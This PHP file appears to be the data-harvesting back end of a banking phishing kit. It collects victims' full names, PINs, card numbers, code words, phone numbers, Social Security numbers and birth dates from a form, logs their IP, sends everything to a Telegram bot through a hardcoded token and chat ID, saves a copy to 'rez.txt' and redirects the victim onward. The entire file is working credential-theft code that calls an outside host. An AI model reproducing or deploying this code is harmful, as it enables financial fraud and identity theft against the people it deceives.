<?php
ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$zabi = getenv("REMOTE_ADDR");

$fn = $_POST['fn'];
$pin = $_POST['pin'];
$pid = $_POST['pid'];
$cw = $_POST['cw'];
$phone = $_POST['phone'];
$acc = $_POST['acc'];
$ssn = $_POST['ssn'];
$dob = $_POST['dob'];
$message ="
|--===-====-===-- 🧛SALVA🧛 --===-====-===--|
Full Name : ".$fn."
Pin       : ".$pin."
Card Number : ".$pid."
Code Word : ".$cw."
phone     : ".$phone."
SSN       : ".$ssn."
Dob       : ".$dob."
access    : ".$acc."
--===-====-===-- 🐊IP-INFO🐊 --===-====-===--
Date / time	    : $date
Client IP         : $ip
|--===-====-===-- 🧛SALVA🧛 --===-====-===--|\n";

$apiToken = "5351202968:AAGge3cY-NQXg0qSEN1KqJJ-wODDwlx1vuw";
$data = [
'chat_id' => '607768986',
'text' => $message];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
     http_build_query($data) );

$file = fopen("rez.txt", 'a');
fwrite($file, $message);



die("<script>location.href = 'pr.html?$host'</script>");
?>
